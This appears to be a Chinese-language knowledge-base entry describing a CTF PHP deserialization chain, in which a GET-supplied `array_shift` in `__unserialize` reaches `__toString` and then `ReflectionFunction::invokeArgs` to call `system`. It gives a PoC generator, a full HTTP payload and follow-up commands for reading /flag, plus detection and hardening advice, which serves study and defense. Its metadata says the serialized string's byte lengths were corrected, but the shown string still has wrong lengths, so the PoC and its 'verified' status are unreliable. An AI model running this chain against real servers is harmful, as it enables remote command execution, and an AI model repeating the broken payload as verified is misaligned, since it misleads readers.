---
id: web-php-deserialization-unserialize-get-variable-function-array-shift-callable
title: __unserialize 里把 $_GET 当可变函数 + array_shift 取出 callable 数组：一步进到 __toString，再用可变类/可变方法调 ReflectionFunction::invokeArgs
type: scenario
domain: web
path: web/php/deserialization
technique: php-unserialize-get-callable-array-shift-variable-class-invoke
aliases:
- __unserialize 可变函数入口
- array_shift 取 callable 数组
- $change($_GET) 动态函数
- ReflectionFunction invokeArgs 执行 system
- PHP 不比 Java 差
tags:
- php
- php8
- deserialization
- magic-method
- variable-function
- callable-array
- reflection
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:52:12+08:00'
  notes: 已对照原文核对；本次核对未读取图片；入口 unserialize([data]) + Geek::__unserialize 里 \=\[change] / \=\(\) / \()、Syclover::__toString 的 new \->Where(\->IS) 与 \->\(\->Girlfriend)、以及 exp 中 Where=ReflectionFunction/IS=call_user_func/Starven=invokeArgs/Girlfriend=['system','file -f /flag'] 均与正文一致；已修正 PoC 序列化串中 ReflectionFunction(18)/call_user_func(14)/file -f /flag(13) 的字节长度错误；PoC 未对真实目标执行；原文为 CTF，无受影响版本
---

## 一句话结论

当反序列化入口写着 `$FUNC = $change($data); $FUNC();`、而 `$change` 直接取自 `$_GET` 时，攻击者不仅能把 `$change` 指定成 `array_shift`，还能**控制 `$data`（即反序列化出来的属性数组）的每个元素**：让第一个元素是 `[$obj, '__toString']` 这样的 callable 数组，`array_shift` 把它弹出来交给 `$FUNC()`，就一步跳到 `__toString`；随后 `__toString` 里的 `new $this->Where($this->IS)` 与 `$eee->$fff($this->Girlfriend)` 又是可变类/可变方法，填 `ReflectionFunction` + `call_user_func` + `invokeArgs` + `['system','file -f /flag']` 即完成命令执行。

## 原理

- **入口比 `__wakeup` 更“主动”**：PHP 7.4+ 的反序列化会调用 `__unserialize(array $data)`，`$data` 就是序列化串里的属性名值对。本题在里面把 `$data` 直接交给来自 GET 的函数名 `$change`，于是“选函数”与“传参数”两件事都被攻击者掌握。
- **callable 数组是合法返回值**：`array_shift($data)` 返回数组第一个元素；如果该元素是 `[对象, '方法名']`，`$FUNC()` 就是 `$obj->{'方法名'}()`。这里填 `[Syclover 实例, '__toString']` 即触发 `__toString`（任何 `echo`/字符串上下文也会触发，但此处是直接调用）。
- **`__toString` 里是“可变类 + 可变方法”**：`$eee = new $this->Where($this->IS);` 用属性当类名、当构造参数；`$fff = $this->Starven; $eee->$fff($this->Girlfriend);` 用属性当方法名、当唯一实参。三者全可控 ⇒ 任意“类名 + 构造函数参数 + 方法名 + 方法参数”的组合。
- **为什么落到 ReflectionFunction**：`ReflectionFunction('call_user_func')` 构造成功，再调 `invokeArgs(['system','file -f /flag'])`，等价于 `call_user_func('system','file -f /flag')`。用反射而不是直接 `call_user_func` 的原因是这里只能拼出“构造函数参数 + 一个方法调用”，反射类把“函数名 + 参数数组”刚好塞进这一个方法调用里。
- **过滤常被绕过**：`error_reporting(0)` 让告警不可见，`__unserialize` 返回值声明为 `void` 也不影响链；黑名单若只挡 `system`/`eval`，可用 `call_user_func`/`ReflectionFunction` 这类“不执行代码但能间接调用”的类名绕过。

## 触发条件

- 存在 `unserialize($_POST/... )` 且类定义里有 `__unserialize`（或 `__wakeup`）。
- `__unserialize` 中存在“函数名来自请求、参数来自反序列化数据”的写法（`$change($data); $FUNC();`、`call_user_func($f, $data)`）。
- 链上还有一个 `__toString`（或其它魔术方法）内部做可变类实例化/可变方法调用。
- 目标 classpath（内置类即可）有 `ReflectionFunction`/`ReflectionClass`，且 `disable_functions` 未禁用最终 sink（`system`/`exec`）。

## 利用步骤

1. 读源码，从 `unserialize` 入口找 `__unserialize`/`__wakeup`，确认 `$change` 是否来自 `$_GET`/`$_POST`。
2. 找下一个魔术方法（本题 `Syclover::__toString`），确认其内部是否存在可变类/可变方法 sink。
3. 构造 payload：`Geek->a = [Syclover 实例, '__toString']`（数组第一个元素是 callable），`Syclover->Where='ReflectionFunction'`、`IS='call_user_func'`、`Starven='invokeArgs'`、`Girlfriend=['system','file -f /flag']`。
4. 提交 `?change=array_shift` + `data=<序列化串>`；服务端 `array_shift($data)` 取出 callable，`$FUNC()` 触发 `__toString`，反射调用 `system`。
5. 若 `file -f /flag` 因 SUID/权限受限，换 `cat /flag`、`cp /flag /var/www/html/x.txt` 等命令；需要回显时用 `passthru`/`shell_exec` 并让 `echo` 输出。

## PoC

```php
<?php
class Geek { public $a; public $b; }

class Syclover { public $Where; public $IS; public $Starven; public $Girlfriend; }

$a = new Geek();

$eval = new Syclover();
$eval->Where      = 'ReflectionFunction';   // 类名
$eval->IS         = 'call_user_func';       // 构造函数参数
$eval->Starven    = 'invokeArgs';           // 方法名
$eval->Girlfriend = array('system', 'file -f /flag');  // 方法参数

$a->a = array($eval, '__toString');          // 交给 array_shift 的 callable 数组

echo serialize($a);
```

```text
POST /?change=array_shift HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

data=O:4:"Geek":2:{s:1:"a";a:2:{i:0;O:8:"Syclover":4:{s:5:"Where";s:16:"ReflectionFunction";s:2:"IS";s:13:"call_user_func";s:7:"Starven";s:10:"invokeArgs";s:10:"Girlfriend";a:2:{i:0;s:6:"system";i:1;s:12:"file -f /flag";}}i:1;s:10:"__toString";}s:1:"b";N;}
```

说明：PoC 按原文 exp 与源码还原，序列化串为按结构手写的示意（属性名长度需按实际类定义校正）；未对真实目标执行。

## 变体与关联

- **入口函数变体**：`array_shift`/`array_pop`/`current`/`reset`/`end`（取数组元素）、`call_user_func`/`call_user_func_array`、`usort`（回调）、`preg_replace_callback`；甚至 `$change='assert'`。
- **callable 形态变体**：`[对象,'__toString']`、`[对象,'任意公开方法']`、`'类名::静态方法'`、`[对象,'__destruct']`（PHP 不允许直接调魔术方法的部分组合需实测）。
- **反射 sink 变体**：`ReflectionFunction`/`ReflectionMethod`/`ReflectionClass`/`ReflectionProperty`；`newInstanceArgs`、`invokeArgs`、`setAccessible` 组合可读写私有属性、调用私有方法。
- **关联**：`web-php-deserialization-call-variable-class-method-reflection-invokeargs`（同类的可变类/可变方法 + `ReflectionFunction::invokeArgs`，入口是 `__call`）、`web-php-rce-variable-class-function-call-reflection`（非反序列化的可变类调用原语）、`web-php-deserialization-destruct-tostring-get-invoke-call-user-func`（同款 `__toString` 跳板但链尾是 `call_user_func`）。
- **边界**：`$change` 若被白名单限制、或 `$data` 未被原样传递（例如先做 `array_values` 再校验类型），本入口失效；PHP 8 中 `__unserialize` 返回类型声明为 `void` 不代表不能触发副作用。

## 检测与防御

- **代码层**：绝不允许“函数名/类名来自请求”；`__unserialize`/`__wakeup` 里不要对入参做函数调用，只做数据校验与赋值。
- **反序列化**：改用 JSON；必须反序列化时用 `allowed_classes` 白名单 + 签名校验（HMAC）。
- **sink 收窄**：`__toString`/`__get`/`__call` 中禁止 `new $var(...)` 与 `$obj->$method(...)`；`ReflectionFunction`/`ReflectionClass` 加入禁用类名单（`disable_classes`）。
- **加固**：`disable_functions` 覆盖 `system/exec/shell_exec/passthru/proc_open/popen`；`open_basedir` 限制。
- **检测**：请求参数出现 `change=` 且值为内置函数名（`array_shift`/`call_user_func`）；`data=` 中出现 `O:`/`a:2:{i:0;O:` 与 `__toString` 字面量；`ReflectionFunction`/`invokeArgs` 出现在请求体或错误日志中。
